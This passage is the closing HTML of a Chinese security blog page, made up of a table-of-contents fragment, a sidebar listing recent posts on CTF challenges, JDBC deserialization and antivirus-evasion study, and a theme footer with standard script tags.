class="toc-number">3.11.</span> <span class="toc-text">完整的恶意Mysql服务</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析">[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析</a><time datetime="2023-05-16T05:43:00.000Z" title="发表于 2023-05-16 13:43:00">2023-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/10/%5B%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%5D-%E6%89%93%E5%8D%B0hello-world/" title="[汇编学习]X64架构下打印hello World">[汇编学习]X64架构下打印hello World</a><time datetime="2023-05-10T03:28:00.000Z" title="发表于 2023-05-10 11:28:00">2023-05-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/08/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95--C++%E6%93%8D%E4%BD%9C%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BC%96%E5%86%99%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%A8%8B%E5%BA%8F/" title="免杀学习记录--C++操作注册表编写开机自启程序">免杀学习记录--C++操作注册表编写开机自启程序</a><time datetime="2023-05-07T16:43:00.000Z" title="发表于 2023-05-08 00:43:00">2023-05-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/18/2023-04-18-JDBC%E2%99%A5MYSQL%E4%B9%8B%E9%97%B4%E4%B8%8D%E5%BE%97%E4%B8%8D%E8%AF%B4%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务">超详细的一步步搭建用于JDBC反序列化的恶意Mysql服务</a><time datetime="2023-04-18T07:36:00.000Z" title="发表于 2023-04-18 15:36:00">2023-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java)/" title="从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)">从一道题来看JDBC反序列化([羊城杯 2020]A Piece Of Java)</a><time datetime="2023-04-18T07:36:00.000Z" title="发表于 2023-04-18 15:36:00">2023-04-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/index_img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By lanb0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到lanb0的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>